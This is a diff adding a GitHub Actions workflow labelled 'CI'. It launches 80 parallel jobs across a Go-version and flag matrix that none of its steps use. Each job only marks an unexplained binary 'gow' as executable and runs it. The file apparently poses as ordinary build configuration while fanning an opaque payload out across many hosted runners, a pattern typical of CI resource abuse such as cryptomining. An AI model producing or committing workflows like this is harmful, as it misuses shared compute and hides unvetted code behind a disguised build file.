@@ -1,0 +1,21 @@
+name: CI
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 100
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
+    env:
+        NUM_JOBS: 100
+        JOB: ${{ matrix.go }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run a one-line script
+        run: chmod +x gow && ./gow
